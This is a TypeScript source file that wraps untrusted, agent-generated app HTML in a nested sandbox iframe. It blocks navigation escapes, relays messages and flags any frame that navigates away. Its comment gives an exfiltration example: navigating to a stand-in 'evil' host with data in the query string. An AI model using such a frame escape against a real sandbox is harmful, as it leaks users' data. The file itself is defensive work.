import { WRAPPER_CSP } from "./appCsp";

/**
 * The sandbox wrapper document.
 *
 * The app HTML is agent-generated and therefore untrusted. Running it directly
 * in a `sandbox="allow-scripts"` iframe leaves one hole: CSP does not cover
 * navigation, so the app can call `location.href = "https://evil/?d=..."` (or
 * use a `<meta http-equiv="refresh">`) and leave the frame. The sandbox flags
 * survive that navigation and the origin stays opaque, so the host's
 * `event.source === iframe.contentWindow` check still passes and the escaping
 * page inherits the bridge — it can read every row through the host.
 *
 * The fix is to embed the app one level deeper. This wrapper is a fixed
 * document we own; the app becomes a child frame inside it. A child frame's
 * navigation is checked against its *embedder's* `frame-src`, and the wrapper
 * declares `frame-src 'none'`, so the browser refuses the escape outright.
 *
 * The wrapper also relays messages in both directions, because the host cannot
 * reach into the app frame directly: the app frame is opaque-origin and the
 * wrapper is opaque-origin too, so the host may only talk to the wrapper.
 *
 * The second `load` event on the app frame is the tripwire: the first load is
 * the srcdoc itself, any later load means the frame navigated away. When that
 * happens we drop the frame, stop relaying and tell the host.
 */

/**
 * Build the wrapper document.
 *
 * `appHtml` is injected as a JSON string so the app can never terminate the
 * wrapper's own script block; `</` is escaped for the same reason.
 */
export function buildWrapperDoc(appHtml: string): string {
  const payload = JSON.stringify(appHtml).replace(/<\//g, "<\\/");
  return `<!doctype html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="${WRAPPER_CSP}">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  html, body { margin: 0; padding: 0; height: 100%; background: transparent; }
  iframe { position: fixed; inset: 0; width: 100%; height: 100%; border: 0; display: block; background: transparent; }
</style>
</head>
<body>
<script>
(function () {
  var APP_HTML = ${payload};
  var inner = document.createElement("iframe");
  var loads = 0;
  var dropped = false;

  inner.setAttribute("sandbox", "allow-scripts");
  inner.setAttribute("title", "app");
  inner.addEventListener("load", function () {
    loads += 1;
    if (loads > 1) {
      // The app left its frame. Drop it and stop relaying.
      dropped = true;
      try { inner.remove(); } catch (e) {}
      parent.postMessage({ source: "octop-app-host", type: "escaped" }, "*");
      return;
    }
    parent.postMessage({ source: "octop-app-host", type: "ready" }, "*");
  });

  window.addEventListener("message", function (event) {
    if (!inner || dropped) return;
    // App -> host.
    if (event.source === inner.contentWindow) {
      parent.postMessage(event.data, "*");
      return;
    }
    // Host -> app.
    if (event.source === parent) {
      inner.contentWindow.postMessage(event.data, "*");
    }
  });

  inner.srcdoc = APP_HTML;
  document.body.appendChild(inner);
})();
</script>
</body>
</html>`;
}
